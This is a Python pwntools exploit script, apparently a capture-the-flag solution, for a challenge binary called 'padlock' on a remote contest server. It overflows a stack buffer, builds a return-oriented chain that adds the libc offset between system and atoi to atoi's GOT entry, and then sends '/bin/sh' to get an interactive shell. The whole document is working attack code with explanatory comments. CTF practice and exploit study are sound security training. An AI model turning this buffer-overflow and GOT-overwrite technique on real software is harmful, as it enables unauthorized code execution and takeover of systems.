#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./padlock', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13578)

OFFSET_TO_RIP = 88

# By running: nm ./padlock | grep "ret"
# we find that:
POP_RDI_RET = 0x4011fb
POP_RSI_RET = 0x401204
POP_RDX_RET = 0x40120d
RET_GADGET = 0x401216

vuln      = elf.sym['vuln']     # address of vuln() function
got_atoi  = elf.got['atoi']     # address of atoi() in the GOT, which initially contains the address of atoi() in libc, but we will overwrite it with the address of system() in libc

add_what_where_address = 0x40121e

# delta = system – atoi  => it is the value we need to add to the GOT entry of atoi() to turn it into system().
# By adding this delta to the GOT entry of atoi(), we will effectively overwrite it with the address of system() in libc.
delta = (libc.symbols['system'] - libc.symbols['atoi'])


p.recvuntil(b'[padlock] Decimal combination: ')
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI_RET), got_atoi, # we want to write to the GOT entry of atoi(), so we set RDI to the address of got_atoi
    p64(POP_RSI_RET), delta,    # we want to add the delta to the GOT entry of atoi(), so we set RSI to the value of delta
    p64(add_what_where_address),    # we call the "add_what_where" function, which will perform the addition: GOT[atoi] += delta
    p64(vuln)     # after overwriting GOT[atoi] we want to return to vuln() to trigger the call to atoi() (which is now system())
)
p.send(stage1)

p.recvuntil(b'[padlock] Decimal combination: ')
p.send(b"/bin/sh\x00")   # atoi("/bin/sh") -> system("/bin/sh")
p.interactive()